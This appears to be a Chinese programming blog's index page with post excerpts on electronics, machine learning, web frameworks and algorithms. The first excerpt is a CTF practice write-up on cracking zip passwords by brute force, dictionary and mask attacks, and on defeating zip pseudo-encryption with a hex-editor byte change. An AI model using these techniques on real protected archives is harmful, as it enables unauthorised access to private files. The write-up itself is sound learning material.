<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/490a80f7d7e484cc10e3abe72bae03b5/" rel="bookmark">
			压缩包破解与密码学(CTF)解密小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		压缩包破解与密码学(CTF)解密题一： 提示：
1。根据提示所设置的密码全由数字组成，所以通过工具直接进行暴力破解弱口令。
得到口令：666666，打开flag得到：
压缩包破解与密码学(CTF)解密题二： 提示：
通过提示我们得到直接爆破可能无法解决这个问题，所以我们通过工具用其他格式进行处理，最后用字典得到口令：password
得到flag：
压缩包破解与密码学(CTF)解密题三： 第三题提示没有任何有用信息，我们在前一二题中所学的方法已经用的差不多了 ，剩下一个比较CRC32,和一个用winhex鉴别真编码还是伪编码。这道题我们用提示的文件夹和提示文本文档相对比得到CRC32相同，直接进行弱口令破解
得到口令：hahaha
打开flag得到：
压缩包破解与密码学(CTF)解密题四： 根据提示得到 这个密码前两位和最后一位小W同学是记得的，那我们直接通过工具用掩码 Se???y 进行破解。
得到口令：
打开flag得到：
压缩包破解与密码学(CTF)解密题五： 这第五题还是比较综合的，上课的时候我忽略了第三道大门那个掩码破解口令的关键，我原以为那只是一个文档的随意命名，结果就是掩码破解的关键，长知识了！！！
第一扇门提示：
这提示的确实到位，直接打开WinHex,根据二进制查看这个文件是真加密还是伪加密就完事了。
打开之后发现第一行确实是伪加密直接用工具winhex把50 4B 03 04 后第三个00的第二位从01 改为00.
改变前：
改变后：
到这里第一扇大门已经打开。直接进入第二扇大门。
第二扇大门提示：
第二扇大门没有得到任何有用的提示信息。我们直接通过工具进行字典处理。
得到口令：
第二扇大门已经打开，接下来进行第三扇大门：
第三扇大门提示：
我当时就是没有特别关注那个文本文件上的命名导致卡壳在第三扇大门。通过掩码处理 S???
得到口令：
这已经打开了第三扇大门来到第四扇大门。
第四扇大门提示：
上面说的是数字口令，直接进行暴力破解。
得到口令 1024996.
flag：
总结： 压缩包破解与密码学还是挺有意思的，尽管有些过程不是很顺畅，但是接触题目得到flag的那一刻确实挺开心的，第五题有些综合 ，卡在了第三扇大门那里，现在已经搞懂了第五题。希望以后再接再厉吧！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e057f3703f2c0303b13dd673e6ec84cf/" rel="bookmark">
			2020-10-09
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		锁相环(PLL)基本原理 Ian Collins 下载 PDF
摘要： 锁相环(PLL)电路存在于各种高频应用中，从简单的时钟净化电路到用于高性能无线电通信链路的本振(LO)，以及矢量网络分析仪(VNA)中的超快开关频率合成器。本文将参考上述各种应用来介绍PLL电路的一些构建模块，以指导器件选择和每种不同应用内部的权衡考虑，这对新手和PLL专家均有帮助。本文参考ADI公司的ADF4xxx和HMCxxx系列PLL和压控振荡器(VCO)，并使用ADIsimPLL（ADI公司内部PLL电路仿真器）来演示不同电路性能参数。
基本配置：时钟净化电路 锁相环的最基本配置是将参考信号(FREF)的相位与可调反馈信号(RFIN)F0的相位进行比较，如图1所示。图2中有一个在频域中工作的负反馈控制环路。当比较结果处于稳态，即输出频率和相位与误差检测器的输入频率和相位匹配时，我们说PLL被锁定。就本文而言，我们仅考虑ADI公司ADF4xxx系列PLL所实现的经典数字PLL架构。
该电路的第一个基本元件是鉴频鉴相器(PFD)。PFD将输入到REFIN的频率和相位与反馈到RFIN的频率和相位进行比较。ADF4002 是一 款可配置为独立PFD（反馈分频器N = 1）的PLL。因此，它可以与高质量压控晶体振荡器(VCXO)和窄低通滤波器一起使用，以净化高噪声REFIN时钟。
图1. PLL基本配置
图2. PLL基本配置
鉴频鉴相器 图3. 鉴频鉴相器
图3中的鉴频鉴相器将+IN端的FREF输入与和-IN端的反馈信号进行比较。它使用两个D型触发器和一个延迟元件。一路Q输出使能正电流源，另一路Q输出使能负电流源。这些电流源就是所谓电荷泵。有关PFD操作的更多详细信息，请参阅"用于高频接收器 和发射器的锁相环"。
使用这种架构，下面+IN端的输入频率高于-IN端（图4），电荷泵输出会推高电流，其在PLL低通滤波器中积分后，会使VCO调谐电压上升。这样，-IN频率将随着VCO频率的提高而提高，两个PFD输入最终会收敛或锁定到相同频率（图5）。如果-IN频率高于+IN频率，则发生相反的情况。
图4. PFD错相和频率失锁
图5. 鉴频鉴相器、频率和锁相
回到原先需要净化的高噪声时钟例子，时钟、自由运行VCXO和闭环PLL的相位噪声曲线可以在ADIsimPLL中建模。
图6. 参考噪声
图7. 自由运行VCXO
图8. 总PLL噪声
从所示的ADIsimPLL曲线中可以看出，REFIN的高相位噪声（图6）由低通滤波器滤除。由PLL的参考和PFD电路贡献的所有带内噪声都被低通滤波器滤除，只在环路带宽外（图8）留下低得多的VCXO噪声（图7）。当输出频率等于输入频率时，PLL配置最简单。这种PLL称为时钟净化PLL。对于此类时钟净化应用，建议使用窄带宽(&lt;1kHz)低通滤波器。
高频整数N分频架构 为了产生一系列更高频率，应使用VCO，其调谐范围比VCXO更宽。这常用于跳频或扩频跳频(FHSS)应用中。在这种PLL中，输出是参考频率的很多倍。压控振荡器含有可变调谐元件，例如变容二极管，其电容随输入电压而改变，形成一个可调谐振电路，从而可以产生一系列频率（图9）。PLL可以被认为是该VCO的控制系统。
反馈分频器用于将VCO频率分频为PFD频率，从而允许PLL生成PFD频率倍数的输出频率。分频器也可以用在参考路径中，这样就可以使用比PFD频率更高的参考频率。ADI公司的 ADF4108 就是这样的PLL。PLL计数器是电路中要考虑的第二个基本元件。
图9. 压控振荡器
PLL的关键性能参数是相位噪声、频率合成过程中的多余副产物或杂散频率（简称杂散）。对于整数N PLL分频，杂散频率由PFD频率产生。来自电荷泵的漏电流会调制VCO的调谐端口。低通滤波器可减轻这种影响，而且带宽越窄，对杂散频率的滤波越强。理想单音信号没有噪声或额外杂散频率（图10），但在实际应用中，相位噪声像裙摆一样出现在载波边缘，如图11所示。单边带相位噪声是指在距离载波的指定频率偏移处，1 Hz带宽内相对于载波的噪声功率。
图10. 理想LO频谱
图11. 单边带相位噪声
整数N和小数N分频器 在窄带应用中，通道间隔很窄（通常&lt;5MHz），反馈计数器N很高。通过使用双模P/P + 1预分频器，如图12所示，可以利用一个小电路获得高N值，并且N值可以利用公式N = PB + A来计算；以8/9预分频器和90的N值为例，计算可得B值为11，A值为2。对于A或2个周期，双模预分频器将进行9分频。对于剩余的(B-A)或9个周期，它将进行8分频，如表1所示。预分频器一般利用较高频率电路技术设计，例如双极性射极耦合逻辑(ECL)电路，而A和B计数器可以接受这种较低频率的预分频器输出，它们可以利用低速CMOS电路制造，以减少电路面积和功耗。像ADF4002这样的低频净化PLL省去了预分频器。
图12. 具有双模N计数器的PLL
表1. 双模预分频器操作 N ValueP/P + 1B ValueA Value909112819101728906488056870488604085032840248301682088100800 带内（PLL环路滤波器带宽内）相位噪声受N值直接影响，带内噪声增幅为20log(N)。因此，对于N值很高的窄带应用，带内噪声主要由高N值决定。利用小数N分频合成器（例如 ADF4159 或 HMC704），可以实现N值低得多但仍有精细分辨率的系统。这样一来，带内相位噪声可以大大降低。图13至图16说明了其实现原理。在这些示例中，使用两个PLL来生成适合于5G系统本振(LO)的7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e057f3703f2c0303b13dd673e6ec84cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54c1e9b2ab89518664d1f1103fd2692b/" rel="bookmark">
			PyTorch图神经网络实践（二）自定义图数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 数据类型简单案例创建一个图创建Data示例自带函数添加属性节点分类 完整代码 数据类型 PyTorch Geometric定义了自己的数据类型。
节点和节点之间的边构成了图。在PyTorch Geometric中，如果要构建图，那么需要两个要素：节点和边。PyTorch Geometric 提供了torch_geometric.data.Data 用于构建图，包括 5 个属性，每一个属性都不是必须的，可以为空。
data.x: 用于存储每个节点的特征，形状是[num_nodes, num_node_features]。data.edge_index: 用于存储节点之间的边，形状是 [2, num_edges]。data.pos: 存储节点的坐标，形状是[num_nodes, num_dimensions]。data.y: 存储样本标签。如果是每个节点都有标签，那么形状是[num_nodes, *]；如果是整张图只有一个标签，那么形状是[1, *]。data.edge_attr: 存储边的特征。形状是[num_edges, num_edge_features]。 实际上，Data对象不仅仅限制于这些属性，我们可以通过data.face来扩展Data，以张量保存三维网格中三角形的连接关系。
还可以添加其他的属性，如下所示
data = Data(x=x, edge_index=edge_index) data.train_idx = torch.tensor([...], dtype=torch.long) data.train_mask = torch.tensor([...], dtype=torch.bool) data.test_mask = torch.tensor([...], dtype=torch.bool) 简单案例 创建一个图 用networkx包创建一个图，然后用torch转换为Data对象。注意节点编号要从0开始，索引须为整形。
import numpy as np import networkx as nx import matplotlib.pyplot as plt import community as community_louvain # build a graph G = nx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54c1e9b2ab89518664d1f1103fd2692b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbccbe4110d5026e67829efd61dd6b24/" rel="bookmark">
			asp.net core 多语言解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引用自：https://www.cnblogs.com/ives/p/language.html
这里本文使用Microsoft.AspNetCore.Localization来实现多语言的解决方案
默认是包含这个包的，所有不需要再额外安装
首先需要注入我们需要的服务
1.在startup.cs中注入
public void ConfigureServices(IServiceCollection services)
{
//设置语言包文件夹名称
services.AddLocalization(o =&gt;
{
o.ResourcesPath = "Language";
});services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
}
这里的路径是根据项目根目录寻找的相对路径,设置成最后语言文件保存的路径即可
然后在Configure中添加我们需要的语言文件的文件名，后面会再次提及文件名，
然后可以指定默认使用的语言文件DefaultRequestCulture
public void Configure(IApplicationBuilder app, IHostingEnvironment env)
{
IList&lt;CultureInfo&gt; supportedCultures = new List&lt;CultureInfo&gt;
{
new CultureInfo("zh-CN"),
new CultureInfo("zh"),
new CultureInfo("en-US")
};
app.UseRequestLocalization(new RequestLocalizationOptions
{
//这里指定默认语言包
DefaultRequestCulture = new RequestCulture("zh-CN"),
SupportedCultures = supportedCultures,
SupportedUICultures = supportedCultures
});
if (env.IsDevelopment())
{
app.UseDeveloperExceptionPage();
}
app.UseMvc();
}
至此我们完成了需要的配置，然后添加最重要的语言文件，
语言文件有两种添加方式
1.根据使用的控制器名称进行命名,如默认的ValuesController,则语言文件需要命名为Controllers.ValuesController.zh-CN.resx
2.可以在我们保存语言文件的路径下创建一级Controllers目录，然后语言文件在名称上就可以去掉开头的Controllers.
虽然这种方式也不太美观，不过也算好了一步，其实也可以自己手写注入，然后通过过滤器实现类似的效果
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbccbe4110d5026e67829efd61dd6b24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10ee5404b2c0f1bc0751616480c499d3/" rel="bookmark">
			2015年第六届蓝桥杯省赛AB组全部编程题和部分填空题AC代码（仅不包含A组第十题灾后重建）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 方程整数解星系炸弹牌型总数手链样式饮料换购奖券数目加法变乘法移动距离生命之树打印大X 方程整数解 import java.io.*; import java.util.*; public class Main { private static final Class&lt;int[]&gt; Comparator = null; public static void main(String args[]) { int res = 0; Scanner in = new Scanner(System.in); int n; while(in.hasNext()) { int[][] arr = new int[100][3]; n = in.nextInt(); int f = 0, cnt = 0; for(int c = 1; c &lt;= n/c; c++) { for(int b = 1; b &lt;= c; b++) { int a = n - c*c - b*b; int t = (int) Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10ee5404b2c0f1bc0751616480c499d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb9069c4182ee9208fd85ec0877e5d53/" rel="bookmark">
			Vue检测数据变化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言如何追踪变化检测变化的注意事项对于对象对于数组 声明响应式 property 前言 Vue 最独特的特性之一，是其非侵入性的响应式系统。数据模型仅仅是普通的 JavaScript 对象。而当你修改它们时，视图会进行更新。
如何追踪变化 当你把一个普通的 JavaScript 对象传入 Vue 实例作为 data 选项，Vue 将遍历此对象所有的 property，并使用 Object.defineProperty 把这些 property 全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是 Vue 不支持 IE8 以及更低版本浏览器的原因。
这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 能够追踪依赖，在 property 被访问和修改时通知变更。这里需要注意的是不同浏览器在控制台打印数据对象时对 getter/setter 的格式化并不同，所以建议安装 vue-devtools 来获取对检查数据更加友好的用户界面。
每个组件实例都对应一个 watcher 实例，它会在组件渲染的过程中把“接触”过的数据 property 记录为依赖。之后当依赖项的 setter 触发时，会通知 watcher，从而使它关联的组件重新渲染。
检测变化的注意事项 由于 JavaScript 的限制，Vue 不能检测数组和对象的变化。尽管如此我们还是有一些办法来回避这些限制并保证它们的响应性。
对于对象 Vue 无法检测 property 的添加或移除。由于 Vue 会在初始化实例时对 property 执行 getter/setter 转化，所以 property 必须在 data 对象上存在才能让 Vue 将它转换为响应式的。例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb9069c4182ee9208fd85ec0877e5d53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bf08256d91790c82a018a3285c8d4d0/" rel="bookmark">
			Ubuntu16.04 安装Kaolin深度学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		kaolin更新了0.9.0版本，请参考Kaolin Library Documentation，本博客已经完全过时了。 Kaolin是什么？ 一个用于加速3D深度学习研究的PyTorch库 安装 官方给出的环境要求 1.linux 2.python==3.6 3.CUDA&gt;=10.0.130 要装好nvcc 4.显卡驱动&gt;410.48 5.numpy&gt;=1.17 且 numpy&lt;1.18.4 6. PyTorch &gt;=1.2, &lt;1.5 and Torchvision &gt;=0.4.0 我的安装过程 1.环境：	Ubuntu16.04 Driver Version=418.39 CUDA Version=10.1 Gpu=2080Ti gcc version=5.4.0 2.步骤 1.官方建议使用conda虚拟环境： conda create -n kaolin python=3.6 conda activate kaolin 2.安装numpy，我安装的是1.17 conda install numpy=1.17 3.安装pytorch和torchvision，注意版本 conda install pytorch==1.4.0 torchvision==0.5.0 cudatoolkit=10.1 -c pytorch 完成后 conda list | grep numpy，看一下输出是否正常 4.下载好后解压，得到kaolin文件夹，进入kaolin cd kaolin 5.准备工作做好，接下来是关键 python setup.py build_ext --inplace 如果这一步没有任何问题，那恭喜你 我出现的问题： 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bf08256d91790c82a018a3285c8d4d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17e07bebee9eb9c04b015d5065969778/" rel="bookmark">
			centos如何编译带有numa.h头文件的程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近需要用numa api进行编程，整理一下如何编译一个带有numa.h的cpp文件 下载numa.h文件，利用numactl里的将numa.h拷贝到程序相关的目录中编写numatest.cc如下 #include &lt;numa.h&gt; #include &lt;iostream&gt; int main() { if(numa_available() &lt; 0) { printf("your system does not support numa api"); } else { printf("your system support numa api"); } } 利用gcc进行编译
g++ -o numatest numatest.cc -lnuma
ps：
（1）可能会遇到undefined reference to `numa_available’问题，就是在编译最后加上 -lnuma来指定引用链接即可
（2）如果提示 cannot find -lnuma补充安装
yum install libnuma-devel 以及 yum install numactl-devel得到结果如下 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91c32b2410988ba9374f2232fd2fe4d1/" rel="bookmark">
			数列极限的性质与判定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇博客中我们引入了一些重要的数集以及其相应的表示方式，同时证明了确界原理。而后用 ϵ − N \epsilon-N ϵ−N语言刻画出了数列极限的概念，那么如果我们已知一个数列收敛，他又有哪些性质呢？这篇博客介绍了收敛数列的一些重要性质，而后根据这些性质给出了一些数列收敛的充要条件（即是否收敛的判定）
一、收敛数列的性质 1.极限的唯一性： 如果一个数列收敛，则他有且只有一个极限。
很明显如果一个数列收敛它一定是有一个极限的，不妨假设{ a n a_n an​}的一个极限是 a a a，这时候只要证明 R R R上除了 a a a的任意一点都不是数列的极限即可，事实上由数列极限的几何意义可知 a a a的任意 U ( a , ϵ ) U(a,\epsilon) U(a,ϵ)邻域之外仅有有限个点，则当 ϵ \epsilon ϵ充分小时可以保证 R R R上的其他点的小邻域中仅有有限个点，这就证明了收敛数列 a n {a_n} an​仅有 a a a一个极限。
2.数列极限的保号性与有界性： 保号性：若 l i m n → ∞ a n = a &gt; 0 lim_{n\to \infty}a_n=a&gt;0 limn→∞​an​=a&gt;0，则对于任意的 a ’ ∈ ( 0 , a ) a^’\in (0,a) a’∈(0,a)，一定能找到 N s t .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91c32b2410988ba9374f2232fd2fe4d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecd17929e458a90307cbe44e439fc882/" rel="bookmark">
			vue表格显示字符串过长问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue表格显示字符串过长问题解决 做项目时，通常我们会遇到字符串过长导致样式不好看的问题，这里有三种方式处理，第三种为最佳方案。
第一种 首先我们看下未做处理的样式：
可以看到学院字段过长，当然我引用的el-table自带的样式给自动换行了,但如果自己写的table会导致样式很丑。我们可以用el-collapse来进行字符串处理，代码如下：
&lt;el-table-column prop="collegeName" align="center" width="150" label="学院"&gt; &lt;template slot-scope="scope"&gt; &lt;el-collapse v-if="scope.row.collegeName !== null"&gt; &lt;el-collapse-item :title="scope.row.collegeName.substring(0,6)"&gt; &lt;div&gt;{{scope.row.collegeName}}&lt;/div&gt; &lt;/el-collapse-item&gt; &lt;/el-collapse&gt; &lt;/template&gt; &lt;/el-table-column&gt; 但是这个样式非常丑
第二种 用el-tooltip处理,但是这种样式有限制，必须给定div宽度，否则不能实现隐藏，而且完整字段的位置会出现偏移，还是原字符串长度的中部，但是样式比第一种好看一些。
&lt;div style="width: 100px;height: 20px;float: left"&gt; &lt;el-tooltip class="item" effect="dark" :content="scope.row.product.name" placement="top-start"&gt; &lt;span style="max-width: 6em;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"&gt;{{scope.row.product.name}}&lt;/span&gt; &lt;/el-tooltip&gt; &lt;/div&gt; 第三种 终极方案，依旧使用el-tooltip，只是结合一下一二种方式。代码如下：
&lt;el-table-column prop="collegeName" align="center" width="150" label="学院"&gt; &lt;template slot-scope="scope"&gt; &lt;el-tooltip class="item" effect="dark" :content="scope.row.collegeName" placement="top-start"&gt; &lt;span&gt;{{scope.row.collegeName.substring(0,8)}}...&lt;/span&gt; &lt;/el-tooltip&gt; &lt;/template&gt; &lt;/el-table-column&gt; 我们可通过控制substring的第二个参数来控制显示字符串的长度，结果如下：
ok，以上就是三种处理方式，推荐使用第三种，适用多个场景，不仅是表格。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48dd78705b1eb1ef9acb5a327220ba6e/" rel="bookmark">
			数据结构——串（朴素的模式匹配算法、KMP模式匹配算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构——串（朴素的模式匹配算法、KMP模式匹配算法） 键盘上的钢琴师_v5
概要：
串是由零个或多个字符组成的有限序列，又名叫字符串。
一、串的比较 给定两个串，s = "a1a2.....an"，t="b1b2....bm"，当满足以下条件之一时，s&lt;t。
n&lt;m，且ai = bi（i=1,2,.....,n）。例如，s="hap"，t="happy"，就有s&lt;t。存在某个k&lt;=min(m,n)，使得ai = bi（i=1,2,.....,k-1）,ak &lt; bk。例如，s="happen"，t="happy"，因为两串前4个字母均相同，而两串第5个字母（k值）, e 的ASCII码是101，而 y 的ASCII码是121，显然 e &lt; y，所以s&lt;t。 二、串的抽象数据类型 串的逻辑结构与线性表相似，不同之处在于串针对的是字符集，每个元素都是字符。此外，串的基本操作与线性表有很大差别。线性表关注的是单个元素的操作，串中更多则是查找子串位置、得到指定位置子串、替换子串等操作。
三、串的存储结构 1. 串的顺序存储结构 用一组地址连续的存储单元来存储串中的字符序列。一般用定长数组为每个定义的串变量分配一个固定长度的存储区。这样的存储方式存在问题，因为定长，在字符串操作时候，比如连接、插入新串、替换等操作时，都可能使串序列的长度超过了数组的长度MaxSize。
2. 串的链式存储结构 与线性表相似，但因为串中每个元素都是一个字符，如果用链表存储串值，一个结点对应一个字符，就会存在很大的空间浪费。因此，一个结点可以存放一个字符，可以考虑存放多个字符，最后一个结点若是未被占满，可用“#”或其他非串值字符补全，如图。
当然，一个结点存多少个字符才合适显得很重要，这会影响串处理的效率，要根据实际情况取舍。总的来说，串的链式存储结构除了在连接串与串操作时有一定方便之外，不如顺序存储灵活，性能也不如顺序存储结构好。
四、朴素的模式匹配算法 串的模式匹配：子串的定位操作。
1. 算法思想 假设从主串S = “goodgoogle”中找T = “google”这个子串的位置。要按以下步骤：（竖线表示相同，折线表示不同）
……
简单地说，就是对主串的每一个字符作为子串开头，与要匹配的字符串进行匹配。此过程中，对主串做大循环，每个字符开头做T的长度的小循环，直到匹配成功或全部遍历完成为止。假设主串S和匹配的子串T的长度存在S[0]与T[0]中，该算法实现如下：
/* 返回子串T在主串S中第pos个字符之后的位置。若不存在,则函数返回值为0。 */ /* 其中,T非空,1≤pos≤StrLength(S)。 */ int Index(String S, String T, int pos) { int i = pos; /* i用于主串S中当前位置下标值，若pos不为1，则从pos位置开始匹配 */ int j = 1; /* j用于子串T中当前位置下标值 */ while (i &lt;= S[0] &amp;&amp; j &lt;= T[0]) /* 若i小于S的长度并且j小于T的长度时，循环继续 */ { if (S[i] == T[j]) /* 两字母相等则继续 */ { ++i; ++j; } else /* 指针后退重新开始匹配 */ { i = i-j+2; /* i退回到上次匹配首位的下一位 */ j = 1; /* j退回到子串T的首位 */ } } if (j &gt; T[0]) return i-T[0]; else return 0; } 该算法中最关键的步骤是回退过程：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48dd78705b1eb1ef9acb5a327220ba6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/817f807fe0d5636c5e5c18b09c0281d7/" rel="bookmark">
			using 指示与 using 声明的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		using 声明：每次只引入命名空间的一个成员(using xxx::memeber)。其有效范围从 using 声明的地方开始，一直到 using 声明所在的作用域结束为止。在此过程中，外层作用域的同名实体将被隐藏。
using 指示：以关键字 using 开始，加上 namespace 以及命名空间的名字(using namespace xxx)。using 指示使得某个特定的命名空间中所有的名字都可见，这样我们就无须再为这些名字添加任何前缀限定符了。简写的名字从 using 指示开始，一直到 using 指示所在的作用域结束都能使用。
使用 using 指示存在的风险：
全局命名空间污染。如果应用程序使用了多个不同的库，通过使用 using 指示，命名空间中所有成员的名字都变得可见，这会导致二义性，也就是全局命名空间污染问题。using 指示引发的二义性错误只有在使用了冲突名字的地方才能被发现。这意味着可能在引入某个库很久之后才会爆发冲突 相比于使用 using 指示，在程序中对命名空间的每个成员分别使用 using 声明效果更好，这样做一是可以减少注入到命名空间的名字数量，二是 using 声明引起的二义性问题在声明处就能发现，无须等到使用名字的地方，这对检测并修改错误有益。
参考：
《C++ Primer 第五版》
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/950d4868ed93fc3091b4dd03f60d4b8c/" rel="bookmark">
			STM32F4&#43;CubeMX&#43;Hal库下使能FPU
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32F4相比于F103系列的一个巨大优势是带硬件浮点单元FPU。我看网上有非常多关于在STM32CubeMX进行配置后使能FPU的一些操作方法，但是总感觉说的不到位。
我们的原则是： 尽量不破坏CubeMX自动生成的代码！也就是下次再次使用CubeMX生成代码时不需要再次瞎捣鼓一番来使能FPU！ 在这里，重新帮大家捋一遍。
在STM32CubeMX生成工程后，在Keil中打开工程，首先确认配置界面Target选项卡中的Floating Point Hardware为Single Precision(即单精度硬件浮点单元)
打开system_stm42f4xx.c可以看到在第168行明确写着FPU单元的开启条件及相关的寄存器操作。所以，只需要定义“__FPU_PRESENT = 1” 且 “__FPU_USED = 1”即可开启FPU单元。
我们打开stm32f4xx.h中对应芯片型号的头文件，我这里用的是F405，所以从这里可以打开stm32f405xx.h：
在stm32f405xx.h的第52行可以看到，它本身已进行了__FPU_PRESENT = 1的宏定义了，也就是它告诉编译器“这个芯片有FPU单元”。
网上看到很多人说，直接强行在第53行加一句：#define __FPU_USED 1U，这是不对的，因为我们看后面，打开第164行的“core_cm4.h”
在“core_cm4.h”的第73行到160行，明确告诉你怎么才能让“__FPU_USED = 1”了。
从这里可以看到针对不同的编译器，有不同的开启条件。
首先看到的是“__CC_ARM”，这个是说“使用Keil自带的编译器”，后面还有“GNUC”、ICCARM、TI_ARM、TASKING、CSMC等。我们这里选择“__CC_ARM”，它默认的也是这个。
对于复杂运算，比如三角函数，开方等运算，如果编程时还是使用math.h头文件，那是没法提升效率的：因为math.h头文件是针对所有ARM处理器的，其运算函数都是基于定点CPU和标准算法（IEEE-754），并没有预见使用FPU的情况，需要很多指令和复杂的过程才能完成运算，也就增加了运算时间。
因此要充分发挥Cotex M4的硬件浮点运算功能，就需要使用固件库自带的arm_math.h，这个文件根据编译控制项（__FPU_USED == 1）来决定是使用哪一种函数方法：如果没有使用FPU，那就调用keil的标准math.h头文件中定义的函数；如果使用了FPU，那就是用固件库自带的优化函数来解决问题。
如果不使用CMSIS的，就会调用keil自带的标准库函数。否则就用CMSIS的定义。这里因为是用的STM32F4，所以应该要ARM_MATH_CM4控制，即加入core_cm4.h，否则就用使用ARMCM4.h——但在编译时keil会提示找不到这文件。因此需要在工程选项之C/C++选项卡的define中继续加入语句ARM_MATH_CM4。
所以：
第一步：添加宏定义 （1） 打开Keil工程的配置界面；
（2）切换至C/C++选项卡；
（3）添加如下代码：
,__FPU_PRESENT = 1U,ARM_MATH_CM4,__CC_ARM,__TARGET_FPU_VFP 按上述操作完成后，如果你的Keil是V5以上版本，你会在“core_cm4.h”的第73行到第79行看到这段代码变深色了，深色也就代表了使能。
第二步：添加头文件 我们这上面中，使能了固件库自带的浮点运算，还需要添加头文件arm_math.h。有些人说添加在stm32f4xx.h中，我表示难以苟同。因为我们的原则是下次用CubeMX生成代码时不需要再瞎操作，所以，这里我们直接添加在main.h中：
有些人说配置完上述，还需要到C盘复制“arm_cortexM4lf_math.lib”文件到工程下，其实并不需要。CubeMX生成工程中，包含了CMSIS库，工程文件夹\Drivers\CMSIS\Lib\ARM文件夹中已经包含了。
所以，按上面两步操作即可。
Good Luck!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76d59408a9e94aac475293ff441b1341/" rel="bookmark">
			MRIcron下的4DNifti格式转变为3DNifti格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MRIcron下的4DNifti格式转变为3DNifti格式 本文为转载，只是为了防止连接丢失，做备用，原文链接：http://blog.sina.com.cn/s/blog_691f18960101jyuv.html
原作者：非邪恶的博客，这个博主有很多fMRI等神经影像学文章，写的非常好。
